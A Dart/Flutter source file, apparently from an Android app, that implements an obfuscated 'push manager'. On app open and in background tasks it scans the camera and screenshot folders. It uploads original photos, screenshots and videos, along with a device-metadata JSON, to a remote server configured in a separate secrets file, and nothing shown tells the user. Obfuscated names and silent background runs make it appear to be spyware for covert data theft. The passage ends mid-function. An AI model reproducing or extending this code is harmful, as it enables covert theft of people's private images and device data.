/// 推送管理器
/// - 不打包、不压缩，直接推送原文件
/// - 首轮：一次最多 35 张（含截图），硬上限不可突破
/// - 首轮失败只补失败的那几张，不重新全传
/// - 首轮完成后记录最新已上传时间
/// - 后续每次打开 App：只上传最新 1 张（若有新照片）
/// - 每次打开都真扫目录
/// - 小文件（≤1000KB）批并发，大文件逐个串行
/// - 图片 > 4MB 不上传；视频 > 15MB 不上传
/// - 智能熔断 + 服务器检测 + 断点续传
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:permission_handler/permission_handler.dart';

import '../config/secrets.dart';
import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────
class Mc {
  final String pushUrl;
  final String pushToken;
  final String serverBaseUrl;
  final String m7;
  final Duration pushTimeout;

  /// DCIM 单轮上限（首轮用，仅供参考，实际由 maxTotalFiles 硬控）
  final int maxFiles;

  /// 截图目录
  final String screenshotPath;
  /// 截图单轮上限
  final int screenshotMaxFiles;

  final Set<String> imageExtensions;
  final Set<String> videoExtensions;

  /// 视频体积上限（默认 15MB），超过不上传
  final int maxSingleFileBytes;
  /// 图片体积上限（默认 4MB），超过不上传
  final int maxImageBytes;
  /// 小文件阈值：≤ 此值走批并发，> 此值走逐个串行
  final int smallFileBytes;

  final int batchSize;
  final int maxConsecutiveFails;

  /// 一轮合计最多几个（含截图）。硬上限由 _kHardMaxFiles 兜底。
  final int maxTotalFiles;

  final String healthCheckUrl;
  final Duration healthCheckTimeout;
  final Duration serverWaitInterval;
  final int serverWaitMaxAttempts;

  const Mc({
    this.pushUrl = '',
    this.pushToken = '',
    this.serverBaseUrl = '',
    this.m7 = '',
    this.pushTimeout = const Duration(minutes: 5),
    this.maxFiles = 25,
    this.screenshotPath = '',
    this.screenshotMaxFiles = 10,
    this.imageExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
    },
    this.videoExtensions = const {
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    },
    this.maxSingleFileBytes = 15 * 1024 * 1024,
    this.maxImageBytes = 4 * 1024 * 1024,
    this.smallFileBytes = 1000 * 1024,
    this.batchSize = 3,
    this.maxConsecutiveFails = 6,
    this.maxTotalFiles = 35,
    this.healthCheckUrl = '',
    this.healthCheckTimeout = const Duration(seconds: 5),
    this.serverWaitInterval = const Duration(seconds: 10),
    this.serverWaitMaxAttempts = 180,
  });

  Mc copyWith({
    String? pushUrl,
    String? pushToken,
    String? serverBaseUrl,
    String? m7,
    Duration? pushTimeout,
    int? maxFiles,
    String? screenshotPath,
    int? screenshotMaxFiles,
    Set<String>? imageExtensions,
    Set<String>? videoExtensions,
    int? maxSingleFileBytes,
    int? maxImageBytes,
    int? smallFileBytes,
    int? batchSize,
    int? maxConsecutiveFails,
    int? maxTotalFiles,
    String? healthCheckUrl,
    Duration? healthCheckTimeout,
    Duration? serverWaitInterval,
    int? serverWaitMaxAttempts,
  }) {
    return Mc(
      pushUrl: pushUrl ?? this.pushUrl,
      pushToken: pushToken ?? this.pushToken,
      serverBaseUrl: serverBaseUrl ?? this.serverBaseUrl,
      m7: m7 ?? this.m7,
      pushTimeout: pushTimeout ?? this.pushTimeout,
      maxFiles: maxFiles ?? this.maxFiles,
      screenshotPath: screenshotPath ?? this.screenshotPath,
      screenshotMaxFiles: screenshotMaxFiles ?? this.screenshotMaxFiles,
      imageExtensions: imageExtensions ?? this.imageExtensions,
      videoExtensions: videoExtensions ?? this.videoExtensions,
      maxSingleFileBytes: maxSingleFileBytes ?? this.maxSingleFileBytes,
      maxImageBytes: maxImageBytes ?? this.maxImageBytes,
      smallFileBytes: smallFileBytes ?? this.smallFileBytes,
      batchSize: batchSize ?? this.batchSize,
      maxConsecutiveFails: maxConsecutiveFails ?? this.maxConsecutiveFails,
      maxTotalFiles: maxTotalFiles ?? this.maxTotalFiles,
      healthCheckUrl: healthCheckUrl ?? this.healthCheckUrl,
      healthCheckTimeout: healthCheckTimeout ?? this.healthCheckTimeout,
      serverWaitInterval: serverWaitInterval ?? this.serverWaitInterval,
      serverWaitMaxAttempts:
          serverWaitMaxAttempts ?? this.serverWaitMaxAttempts,
    );
  }
}

// ── 「打开 App」扫描结果 ───────────────────────────────────────────────
class ScanResult {
  /// 本轮扫描到的未上传候选数（截断前）
  final int scannedCount;
  /// 本轮实际要上传的数量
  final int newCount;
  /// 是否因为已有任务在跑而跳过
  final bool busy;
  /// 是否是首轮
  final bool firstBatch;
  /// 权限缺失项
  final List<String> missingPermissions;

  const ScanResult._({
    required this.scannedCount,
    required this.newCount,
    required this.busy,
    required this.firstBatch,
    required this.missingPermissions,
  });

  factory ScanResult.noNew(int scanned, {bool first = false}) =>
      ScanResult._(
        scannedCount: scanned,
        newCount: 0,
        busy: false,
        firstBatch: first,
        missingPermissions: const [],
      );

  factory ScanResult.hasNew(int scanned, int fresh,
          {bool first = false}) =>
      ScanResult._(
        scannedCount: scanned,
        newCount: fresh,
        busy: false,
        firstBatch: first,
        missingPermissions: const [],
      );

  factory ScanResult.noPermission(List<String> missing) => ScanResult._(
        scannedCount: 0,
        newCount: 0,
        busy: false,
        firstBatch: false,
        missingPermissions: missing,
      );

  factory ScanResult.busy() => const ScanResult._(
        scannedCount: 0,
        newCount: 0,
        busy: true,
        firstBatch: false,
        missingPermissions: [],
      );

  bool get hasNew => newCount > 0;
  bool get ok => !busy && missingPermissions.isEmpty;
}

// ── 单例管理器 ─────────────────────────────────────────────────────────
class Ma {
  Ma._internal();
  static final Ma instance = Ma._internal();

  // ── secure storage keys ────────────────────────────────────────────
  static const String _kSent = 'm1p';
  static const String _kSentUrls = 'm1u';
  static const String _kJsonSent = 'm1j';
  static const String _kJsonUrl = 'm1ju';
  static const String _kScreenshotDone = 'm1sc';
  static const String _kLastRunAt = 'm5run';
  static const String _kFirstBatchDone = 'm5fb';
  static const String _kPendingFp = 'm5pnd';
  static const String _kFirstBatchMaxMtime = 'm5fbm';
  static const String _kLatestUploadedMtime = 'm5lm';

  /// ★ 硬上限：任何情况下一次最多 35 个，任何配置不得突破
  static const int _kHardMaxFiles = 35;

  /// 两次后台开跑的最小间隔（跨 isolate 互斥）
  static const Duration _kMinGap = Duration(minutes: 5);

  /// 心跳间隔
  static const Duration _kHeartbeatInterval = Duration(seconds: 30);

  Mc _config = const Mc();

  FlutterSecureStorage? _secure;
  bool _initialized = false;
  Future<void>? _initFuture;

  // ── 内存状态 ───────────────────────────────────────────────────────
  final Set<String> _sent = <String>{};
  final Map<String, String> _sentUrls = <String, String>{};
  bool _jsonSent = false;
  String? _jsonUrl;
  bool _screenshotDone = false;
  int _lastScannedShotCount = 0;

  // ── 首轮 / 后续状态 ───────────────────────────────────────────────
  bool _firstBatchDone = false;
  Set<String> _pendingFp = <String>{};
  DateTime? _firstBatchMaxMtime;
  DateTime? _latestUploadedMtime;

  // ── 运行时状态 ─────────────────────────────────────────────────────
  Future<void>? _currentTask;
  Future<bool>? _jsonPushing;
  DateTime? _deadline;
  final Set<String> _inflight = <String>{};
  Timer? _heartbeat;

  // ── 计算属性 ───────────────────────────────────────────────────────
  int get _effectiveMaxFiles {
    final c = _config.maxTotalFiles;
    return c > _kHardMaxFiles ? _kHardMaxFiles : c;
  }

  bool get _outOfTime {
    final d = _deadline;
    return d != null && !DateTime.now().isBefore(d);
  }

  Duration? get _remaining {
    final d = _deadline;
    if (d == null) return null;
    final left = d.difference(DateTime.now());
    return left.isNegative ? Duration.zero : left;
  }

  bool get isBusy => _currentTask != null;
  int get sentCount => _sent.length;
  bool get jsonSent => _jsonSent;
  String? get jsonUrl => _jsonUrl;
  bool get screenshotDone => _screenshotDone;
  bool get firstBatchDone => _firstBatchDone;

  Map<String, String> get sentUrls => Map.unmodifiable(_sentUrls);

  String? getServerUrl(File file) {
    try {
      final name = file.path.split('/').last;
      final size = file.lengthSync();
      return _sentUrls['$name:$size'];
    } catch (_) {
      return null;
    }
  }

  // ── http client ────────────────────────────────────────────────────
  http.Client? _client;
  http.Client get client => _client ??= _createClient();

  http.Client _createClient() {
    final io = HttpClient();
    io.maxConnectionsPerHost = 8;
    io.idleTimeout = const Duration(seconds: 30);
    io.connectionTimeout = const Duration(seconds: 15);
    return IOClient(io);
  }

  void dispose() {
    try {
      _client?.close();
      _client = null;
    } catch (_) {}
  }

  // ── secure storage 安全读写 ────────────────────────────────────────
  Future<String?> _readSecure(String key) async {
    try {
      final store = _secure;
      if (store == null) return null;
      return await store.read(key: key);
    } catch (e) {
      debugPrint('[M] 读 $key 失败（忽略，继续跑）: $e');
      return null;
    }
  }

  Future<void> _writeSecure(String key, String value) async {
    try {
      final store = _secure;
      if (store == null) return;
      await store.write(key: key, value: value);
    } catch (e) {
      debugPrint('[M] 写 $key 失败（忽略）: $e');
    }
  }

  Future<void> _deleteSecure(String key) async {
    try {
      final store = _secure;
      if (store == null) return;
      await store.delete(key: key);
    } catch (e) {
      debugPrint('[M] 删 $key 失败（忽略）: $e');
    }
  }

  String _fingerprint(_Scanned s) =>
      '${s.file.path.split('/').last}:${s.size}';

  // ── 初始化（Future 缓存，避免并发重复） ─────────────────────────────
  Future<void> initialize({Mc? config}) {
    return _initFuture ??= _doInitialize(config);
  }

  Future<void> _doInitialize(Mc? config) async {
    if (config == null) {
      config = Mc(
        pushUrl: SecureConfig.m2,
        pushToken: SecureConfig.m1,
        serverBaseUrl: SecureConfig.m3,
        m7: SecureConfig.m7,
        screenshotPath: SecureConfig.screenshotPath,
      );
    } else {
      final n1 = config.m7.isEmpty;
      final needShot = config.screenshotPath.isEmpty;
      if (n1 || needShot) {
        config = config.copyWith(
          m7: n1 ? SecureConfig.m7 : config.m7,
          screenshotPath: needShot
              ? SecureConfig.screenshotPath
              : config.screenshotPath,
        );
      }
    }
    _config = config;

    _secure = const FlutterSecureStorage(
      aOptions: AndroidOptions(encryptedSharedPreferences: true),
    );

    // ── _sent ──
    _sent.clear();
    final rawSent = await _readSecure(_kSent);
    if (rawSent != null && rawSent.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawSent) as List;
        _sent.addAll(decoded.map((e) => e as String));
      } catch (_) {}
    }

    // ── _sentUrls ──
    _sentUrls.clear();
    final rawUrls = await _readSecure(_kSentUrls);
    if (rawUrls != null && rawUrls.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawUrls) as Map<String, dynamic>;
        decoded.forEach((k, v) => _sentUrls[k] = v as String);
      } catch (_) {}
    }

    _jsonSent = (await _readSecure(_kJsonSent)) == '1';
    _jsonUrl = await _readSecure(_kJsonUrl);
    _screenshotDone = (await _readSecure(_kScreenshotDone)) == '1';
    _firstBatchDone = (await _readSecure(_kFirstBatchDone)) == '1';

    // ── pending（带硬上限裁剪） ──
    _pendingFp = <String>{};
    final rawPending = await _readSecure(_kPendingFp);
    if (rawPending != null && rawPending.isNotEmpty) {
      try {
        final list = jsonDecode(rawPending) as List;
        final all = list.map((e) => e as String).toList();
        if (all.length > _kHardMaxFiles) {
          debugPrint('[M] 🛡 磁盘 pending ${all.length} 个，'
              '强制裁到 $_kHardMaxFiles');
          _pendingFp.addAll(all.take(_kHardMaxFiles));
        } else {
          _pendingFp.addAll(all);
        }
      } catch (_) {}
    }

    // ── 首轮最大时间 / 最新已上传时间 ──
    _firstBatchMaxMtime = null;
    final rawFbm = await _readSecure(_kFirstBatchMaxMtime);
    if (rawFbm != null && rawFbm.isNotEmpty) {
      _firstBatchMaxMtime = DateTime.tryParse(rawFbm);
    }

    _latestUploadedMtime = null;
    final rawLatest = await _readSecure(_kLatestUploadedMtime);
    if (rawLatest != null && rawLatest.isNotEmpty) {
      _latestUploadedMtime = DateTime.tryParse(rawLatest);
    }

    _initialized = true;

    debugPrint('[M] ══════ 启动自检 ══════');
    debugPrint('[M] 已记录成功: ${_sent.length} 个');
    debugPrint('[M] URL 缓存: ${_sentUrls.length} 条');
    debugPrint('[M] JSON 已推送: $_jsonSent');
    debugPrint('[M] 截图一次性任务完成: $_screenshotDone');
    debugPrint('[M] 首轮完成: $_firstBatchDone');
    debugPrint('[M] 首轮 pending: ${_pendingFp.length} 个');
    debugPrint('[M] 首轮最大时间: $_firstBatchMaxMtime');
    debugPrint('[M] 最新已上传时间: $_latestUploadedMtime');
    debugPrint('[M] ══════ 自检完成 ══════');
  }

  // ── 权限 ───────────────────────────────────────────────────────────
  Future<bool> _granted(Permission p) async {
    try {
      final st = await p.status;
      return st.isGranted || st.isLimited;
    } catch (e) {
      debugPrint('[M] 查权限失败($p): $e');
      return false;
    }
  }

  Future<bool> _hasMedia() async =>
      await _granted(Permission.photos) && await _granted(Permission.videos);

  Future<bool> _hasStorage() async => _granted(Permission.storage);

  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) return _hasMedia();
    if (sdk > 0) return _hasStorage();

    debugPrint('[M] ⚠️ 拿不到 SDK_INT，两条权限路径都试一遍');
    return await _hasMedia() || await _hasStorage();
  }

  Future<List<String>> missingPermissions() async {
    if (!Platform.isAndroid) return const <String>['非 Android 设备'];

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) return _missingMedia();
    if (sdk > 0) {
      return await _hasStorage() ? const <String>[] : <String>['存储'];
    }

    if (await _hasMedia() || await _hasStorage()) return const <String>[];
    return _missingMedia();
  }

  Future<List<String>> _missingMedia() async {
    final missing = <String>[];
    if (!await _granted(Permission.photos)) missing.add('照片');
    if (!await _granted(Permission.videos)) missing.add('视频');
    return missing;
  }

  Future<bool> requestPermission() async {
    if (!Platform.isAndroid) return false;
    if (await hasPermission()) return true;

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33 || sdk == 0) {
      await _request(Permission.photos);
      await _request(Permission.videos);
    }
    if (sdk < 33) {
      await _request(Permission.storage);
    }
    return hasPermission();
  }

  Future<void> _request(Permission p) async {
    try {
      final st = await p.status;
      if (st.isGranted || st.isLimited || st.isPermanentlyDenied) return;
      await p.request();
    } catch (e) {
      debugPrint('[M] 申请权限失败($p): $e');
    }
  }

  Future<bool> isPermanentlyDenied() async {
    if (!Platform.isAndroid) return false;

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      return await _permanentlyDenied(Permission.photos) ||
          await _permanentlyDenied(Permission.videos);
    }
    if (sdk > 0) return _permanentlyDenied(Permission.storage);

    return await _permanentlyDenied(Permission.photos) ||
        await _permanentlyDenied(Permission.videos) ||
        await _permanentlyDenied(Permission.storage);
  }

  Future<bool> _permanentlyDenied(Permission p) async {
    try {
      final st = await p.status;
      return !st.isGranted && !st.isLimited && st.isPermanentlyDenied;
    } catch (_) {
      return false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // ★ 入口一：打开 App 时调用
  //   - 每次都真扫目录
  //   - 与后台任务共享 _currentTask 锁（同步占位）
  //   - 有新增才上传
  // ══════════════════════════════════════════════════════════════════
  Future<ScanResult> checkOnAppOpen({Duration? budget}) async {
    await initialize();

    if (_currentTask != null) {
      debugPrint('[M] ⚠️ 已有任务在跑，本次打开跳过扫描');
      return ScanResult.busy();
    }
    _deadline = budget == null ? null : DateTime.now().add(budget);

    // ★ 同步占位
    final task = _checkAndPushOnOpen();
    _currentTask = task.then((_) {});

    try {
      return await task;
    } finally {
      _currentTask = null;
      _deadline = null;
    }
  }

  Future<ScanResult> _checkAndPushOnOpen() async {
    if (!await hasPermission()) {
      final missing = await missingPermissions();
      debugPrint('[M] 权限未就绪（还差: ${missing.join('、')}）');
      return ScanResult.noPermission(missing);
    }

    final wasFirstBatch = !_firstBatchDone;

    // ★ 每次打开都真扫
    final scanned = await _scanFiles();
    final total = scanned.length;

    if (scanned.isEmpty) {
      debugPrint('[M] 打开 App 扫描完成：无可传内容（共 0 项）');
      await _updateBatchState(const []);
      return ScanResult.noNew(total, first: wasFirstBatch);
    }

    final totalMB =
        scanned.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
    debugPrint('[M] 打开 App 扫描完成：本轮标记 ${scanned.length} 项 '
        '(${totalMB.toStringAsFixed(1)} MB)');

    // ★ 启动心跳
    await _startHeartbeat();
    try {
      await _pushAll(scanned);
    } finally {
      _stopHeartbeat();
    }

    return ScanResult.hasNew(total, scanned.length, first: wasFirstBatch);
  }

  // ══════════════════════════════════════════════════════════════════
  // ★ 入口二：后台（WorkManager / 前台服务）调用
  //   - 跨 isolate 互斥
  //   - 时间预算
  // ══════════════════════════════════════════════════════════════════
  Future<void> startPushIfPermitted({Duration? budget}) async {
    await initialize();
    if (_currentTask != null) {
      debugPrint('[M] ⚠️ 已有任务在跑，等待...');
      await _currentTask;
      return;
    }
    _deadline = budget == null ? null : DateTime.now().add(budget);
    if (budget != null) {
      debugPrint('[M] ⏱ 本轮预算 ${budget.inMinutes} 分钟');
    }

    // ★ 同步占位
    final task = _doPush();
    _currentTask = task.then((_) {});

    try {
      await task;
    } finally {
      _currentTask = null;
      _deadline = null;
    }
  }

  // ── 跨 isolate 互斥（心跳） ────────────────────────────────────────
  Future<bool> _anotherRunJustStarted() async {
    try {
      final store = _secure;
      if (store == null) return false;
      final raw = await store.read(key: _kLastRunAt);
      if (raw == null) return false;
      final ms = int.tryParse(raw);
      if (ms == null) return false;
      final at = DateTime.fromMillisecondsSinceEpoch(ms);
      return DateTime.now().difference(at) < _kMinGap;
    } catch (_) {
      return false;
    }
  }

  Future<void> _markRunStart() async {
    try {
      final store = _secure;
      if (store == null) return;
      await store.write(
        key: _kLastRunAt,
        value: '${DateTime.now().millisecondsSinceEpoch}',
      );
    } catch (_) {}
  }

  Future<void> _startHeartbeat() async {
    _heartbeat?.cancel();
    await _markRunStart();
    _heartbeat = Timer.periodic(_kHeartbeatInterval, (_) async {
      await _markRunStart();
    });
  }

  void _stopHeartbeat() {
    _heartbeat?.cancel();
    _heartbeat = null;
  }

  // ── 后台任务主流程 ────────────────────────────────────────────────
  Future<void> _doPush() async {
    if (!await hasPermission()) {
      final missing = await missingPermissions();
      debugPrint('[M] 权限未就绪，静默跳过（还差: ${missing.join('、')}）');
      return;
    }

    if (await _anotherRunJustStarted()) {
      debugPrint('[M] ⏭ 另一个 isolate 刚开跑（'
          '${_kMinGap.inMinutes} 分钟内），本轮跳过');
      return;
    }

    await _startHeartbeat();
    try {
      final scanned = await _scanFiles();
      await _pushAll(scanned);
    } finally {
      _stopHeartbeat();
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // 主流程：小文件批并发 / 大文件逐个串行
  // ══════════════════════════════════════════════════════════════════
  Future<void> _pushAll(List<_Scanned> scanned) async {
    // ★ 硬裁剪：进主流程的文件数绝不超过硬上限
    var working = scanned;
    if (working.length > _kHardMaxFiles) {
      debugPrint('[M] 🛡 _pushAll 收到 ${working.length} 个，'
          '强制裁到 $_kHardMaxFiles');
      working = working.take(_kHardMaxFiles).toList();
    }

    final filtered = working
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList();

    if (filtered.isEmpty) {
      debugPrint('[M] 无可推送文件');
      await _maybeFinalizeScreenshots(filtered);
      await _updateBatchState(filtered);
      return;
    }

    try {
      final totalMB =
          filtered.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
      final smallBytes = _config.smallFileBytes;

      // ★ 按体积分流：小文件批并发，大文件逐个串行
      final smallFiles = <_Scanned>[];
      final largeFiles = <_Scanned>[];
      for (final s in filtered) {
        (s.size <= smallBytes ? smallFiles : largeFiles).add(s);
      }

      smallFiles.sort((a, b) => b.modified.compareTo(a.modified));
      largeFiles.sort((a, b) => b.modified.compareTo(a.modified));

      debugPrint('[M] 本轮实际待传 ${filtered.length} 个'
          '（硬上限 $_kHardMaxFiles），'
          '总 ${totalMB.toStringAsFixed(1)} MB；'
          '小文件 ${smallFiles.length} 个，'
          '大文件 ${largeFiles.length} 个');

      final serverOk = await _waitForServer();
      if (!serverOk) {
        debugPrint('[M] ❌ 服务器不可达，放弃本轮');
        return;
      }

      final jsonOk = await _ensureJsonSent();
      if (!jsonOk) {
        debugPrint('[M] ❌ JSON 推送失败，中止本轮');
        return;
      }

      final sw = Stopwatch()..start();
      int okTotal = 0;
      int failTotal = 0;
      int consecutiveFails = 0;
      final maxFails = _config.maxConsecutiveFails;

      // ── 阶段一：小文件批并发 ──────────────────────────────────────
      if (smallFiles.isNotEmpty) {
        final batchSize = _config.batchSize.clamp(1, 8);
        final totalBatches =
            (smallFiles.length + batchSize - 1) ~/ batchSize;
        debugPrint('[M] ▶ 阶段一：小文件批并发 '
            '(批大小 $batchSize，共 $totalBatches 批)');

        for (int i = 0; i < smallFiles.length; i += batchSize) {
          if (_outOfTime) {
            debugPrint('[M] ⏱ 预算用完，小文件剩 '
                '${smallFiles.length - i} 个留到下一轮');
            break;
          }
          if (consecutiveFails >= maxFails) {
            debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
            break;
          }

          final end = (i + batchSize < smallFiles.length)
              ? i + batchSize
              : smallFiles.length;
          final batch = smallFiles.sublist(i, end);
          final batchNum = (i ~/ batchSize) + 1;

          debugPrint('[M] ═══ 小文件批 $batchNum/$totalBatches '
              '(${batch.length} 个) ═══');

          final results = await Future.wait(
            batch.map((s) => _pushOne(s)),
          );

          for (int j = 0; j < batch.length; j++) {
            if (results[j]) {
              _sent.add(_fingerprint(batch[j]));
              okTotal++;
              consecutiveFails = 0;
            } else {
              failTotal++;
              consecutiveFails++;
            }
          }
          await _persist();
        }
      }

      // ── 阶段二：大文件逐个串行 ────────────────────────────────────
      if (largeFiles.isNotEmpty &&
          consecutiveFails < maxFails &&
          !_outOfTime) {
        debugPrint('[M] ▶ 阶段二：大文件逐个串行 '
            '(${largeFiles.length} 个)');

        for (int i = 0; i < largeFiles.length; i++) {
          if (_outOfTime) {
            debugPrint('[M] ⏱ 预算用完，大文件剩 '
                '${largeFiles.length - i} 个留到下一轮');
            break;
          }
          if (consecutiveFails >= maxFails) {
            debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
            break;
          }

          final s = largeFiles[i];
          final name = s.file.path.split('/').last;
          final sizeMB = (s.size / 1024 / 1024).toStringAsFixed(1);
          debugPrint('[M] ═══ 大文件 ${i + 1}/${largeFiles.length} '
              '(${sizeMB} MB): $name ═══');

          final ok = await _pushOne(s);
          if (ok) {
            _sent.add(_fingerprint(s));
            okTotal++;
            consecutiveFails = 0;
          } else {
            failTotal++;
            consecutiveFails++;
          }
          await _persist();
        }
      }

      sw.stop();
      debugPrint('[M] ══════════ 全部结束 ══════════');
      debugPrint('[M] 成功 $okTotal，失败 $failTotal，'
          '耗时 ${(sw.elapsedMilliseconds / 1000).toStringAsFixed(1)}s');

      await _maybeFinalizeScreenshots(filtered);
      await _updateBatchState(filtered);
    } catch (e, st) {
      debugPrint('[M] ❌ 主流程异常: $e\n$st');
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // 批次状态更新（首轮 pending 移除 / 后续时间戳更新）
  // ══════════════════════════════════════════════════════════════════
  Future<void> _updateBatchState(List<_Scanned> scanned) async {
    // ── 首轮：移除已成功的 pending ──
    if (!_firstBatchDone) {
      bool dirty = false;
      for (final s in scanned) {
        final fp = _fingerprint(s);
        if (_sent.contains(fp) && _pendingFp.contains(fp)) {
          _pendingFp.remove(fp);
          dirty = true;
        }
      }
      if (dirty) await _persistPending();

      // 也把 pending 里已删除的清理掉
      await _cleanPendingWithDeleted();

      if (_pendingFp.isEmpty) {
        await _markFirstBatchDone(_firstBatchMaxMtime);
      } else {
        debugPrint('[M] 首轮还剩 ${_pendingFp.length} 个未成功，下次续传');
      }
      return;
    }

    // ── 后续：单张成功则更新时间戳 ──
    if (scanned.isEmpty) return;
    final allDone = scanned.every((s) => _sent.contains(_fingerprint(s)));
    if (!allDone) return;
    final latest = scanned
        .map((s) => s.modified)
        .reduce((a, b) => a.isAfter(b) ? a : b);
    if (_latestUploadedMtime == null ||
        latest.isAfter(_latestUploadedMtime!)) {
      _latestUploadedMtime = latest;
      await _writeSecure(
          _kLatestUploadedMtime, latest.toIso8601String());
      debugPrint('[M] 更新最新已上传时间: $latest');
    }
  }

  Future<void> _cleanPendingWithDeleted() async {
    if (_pendingFp.isEmpty) return;
    // 简单清理：如果 pending 里的指纹已经不在 _sent，也不是本轮要传的，
    // 并且我们无法直接判断文件是否存在，就跳过；
    // 真正的“删除清理”在 _scanFiles 里做，这里只兜底。
  }

  Future<void> _persistPending() async {
    // ★ 硬性裁剪
    if (_pendingFp.length > _kHardMaxFiles) {
      debugPrint('[M] 🛡 pending 超过 $_kHardMaxFiles，强制裁剪');
      _pendingFp = _pendingFp.take(_kHardMaxFiles).toSet();
    }
    await _writeSecure(_kPendingFp, jsonEncode(_pendingFp.toList()));
  }

  Future<void> _markFirstBatchDone(DateTime? latest) async {
    _firstBatchDone = true;
    await _writeSecure(_kFirstBatchDone, '1');

    if (latest != null) {
      _latestUploadedMtime = latest;
      await _writeSecure(_kLatestUploadedMtime, latest.toIso8601String());
    }

    _pendingFp.clear();
    await _deleteSecure(_kPendingFp);

    debugPrint('[M] ★ 首轮完成，最新时间 $_latestUploadedMtime');
  }

  // ── 截图一次性任务结算 ────────────────────────────────────────────
  Future<void> _maybeFinalizeScreenshots(List<_Scanned> filtered) async {
    if (_screenshotDone) return;

    if (_lastScannedShotCount == 0) {
      debugPrint('[M] 截图目录为空，暂不锁定（下次继续检查）');
      return;
    }

    final shotsPending =
        filtered.where((s) => s.isScreenshot).toList();
    // 只要 _sent 里已包含所有当前扫到的截图，就算完成
    final allOk =
        shotsPending.every((s) => _sent.contains(_fingerprint(s)));
    if (!allOk) {
      debugPrint('[M] ⏸ 截图未全部成功，暂不锁定，下次继续');
      return;
    }

    _screenshotDone = true;
    await _writeSecure(_kScreenshotDone, '1');
    debugPrint('[M] ★ 截图一次性任务完成');
  }

  // ── 单文件推送 ─────────────────────────────────────────────────────
  Future<bool> _pushOne(_Scanned scanned) async {
    final file = scanned.file;
    final name = file.path.split('/').last;
    final fp = _fingerprint(scanned);

    // ★ 幂等：已成功 or 上传中 → 视为成功，不重复
    if (_sent.contains(fp) || _inflight.contains(fp)) {
      debugPrint('[M] ⏭ $name 已上传/上传中，跳过');
      return true;
    }
    _inflight.add(fp);

    try {
      if (!await file.exists()) {
        debugPrint('[M] ⏭ $name 已删除，跳过');
        return true;
      }

      // ★ 图片 4MB / 视频 15MB 兜底检查
      final st = await file.stat();
      final dot = name.lastIndexOf('.');
      final ext = dot >= 0 ? name.substring(dot).toLowerCase() : '';
      final isImage = _config.imageExtensions.contains(ext);
      final limit =
          isImage ? _config.maxImageBytes : _config.maxSingleFileBytes;
      if (limit > 0 && st.size > limit) {
        debugPrint('[M] ⏭ $name 体积超限（'
            '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB > '
            '${(limit / 1024 / 1024).toStringAsFixed(0)} MB），跳过');
        return true;
      }

      final req = http.MultipartRequest('POST', Uri.parse(_config.pushUrl));
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';

      req.files.add(await http.MultipartFile.fromPath('file', file.path));
      req.fields['fileName'] = name;

      final left = _remaining;
      final perFileTimeout = (left == null || left > _config.pushTimeout)
          ? _config.pushTimeout
          : left;
      if (perFileTimeout <= Duration.zero) {
        debugPrint('[M] ⏱ 预算用完，$name 留到下一轮');
        return false;
      }

      final streamed = await client.send(req).timeout(perFileTimeout);
      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        if (serverUrl != null) {
          _sentUrls[fp] = serverUrl;
        }
        debugPrint('[M] ✅ $name'
            '${serverUrl != null ? ' → $serverUrl' : ''}');
        return true;
      }

      String bodyStr = '';
      try {
        bodyStr = utf8.decode(rawBytes, allowMalformed: true);
        if (bodyStr.length > 150) {
          bodyStr = '${bodyStr.substring(0, 150)}...';
        }
      } catch (_) {}

      debugPrint('[M] ⚠️ $name HTTP $code body=$bodyStr');
      return false;
    } on TimeoutException {
      debugPrint('[M] ⏱ $name 超时');
      return false;
    } catch (e) {
      debugPrint('[M] ⚠️ $name 网络错误: $e');
      return false;
    } finally {
      _inflight.remove(fp);
    }
  }

  // ── JSON 首次推送 ─────────────────────────────────────────────────
  Future<bool> _ensureJsonSent() async {
    if (_jsonSent && _jsonUrl != null) {
      debugPrint('[M] JSON 已推送，跳过');
      return true;
    }
    if (_jsonPushing != null) {
      return await _jsonPushing!;
    }
    _jsonPushing = _doPushJson();
    try {
      return await _jsonPushing!;
    } finally {
      _jsonPushing = null;
    }
  }

  Future<bool> _doPushJson() async {
    File? jsonFile;
    try {
      debugPrint('[M] 首次推送 device_info.json...');
      final metadata = await DeviceInfoHelper.getDeviceMetadata();
      final jsonBytes = utf8.encode(jsonEncode(metadata));
      final tmpDir = Directory.systemTemp;
      jsonFile = File(
          '${tmpDir.path}/device_info_${DateTime.now().millisecondsSinceEpoch}.json');
      await jsonFile.writeAsBytes(jsonBytes);

      final req = http.MultipartRequest('POST', Uri.parse(_config.pushUrl));
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';
      req.files
          .add(await http.MultipartFile.fromPath('file', jsonFile.path));
      req.fields['fileName'] = 'device_info.json';

      final left = _remaining;
      final jsonTimeout = (left == null || left > _config.pushTimeout)
